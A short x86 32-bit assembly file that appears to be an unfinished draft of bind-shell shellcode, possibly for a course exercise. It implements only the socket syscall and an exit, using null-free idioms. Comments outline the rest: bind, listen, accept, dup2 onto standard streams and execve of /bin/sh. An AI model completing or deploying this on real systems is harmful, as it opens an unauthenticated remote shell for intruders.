global _start

section .text
_start:

	; 359 socket(AF_INET, SOCK_STREAM, 0); 
	; 	or do I need 102 (socketcall) on 32-bit? 
    xor eax, eax
    mov ax, 359     ; 359 = socket
    xor ebx, ebx
    mov bl, 2       ; 2 = AF_INET
    xor ecx, ecx    
    inc ecx         ; 1 = SOCK_STREAM
    xor edx, edx    ; 0
    int 0x80 

	; sockaddr struct
	;	sin_family = AF_INET
	;	sin_port = htons(SOMEPORT)
	;	sin_addr.s_addr = htonl(INADDR_ANY)

	; 361 bind(fd, sockaddr *, sizeof(sockaddr))

	; 363 listen(fd, backlog)

	; 364 accept(fd, NULL, NULL) --> conn_fd

	; 63 dup2(conn_fd, 0-2)

	; 11 execve("/bin/sh", NULL, NULL)

	; cleanup code...
	
    ; clean exit
	xor eax, eax    
    inc al          ; 1 = exit
    xor ebx, ebx    ; 0 = return SUCCESS
    int 0x80
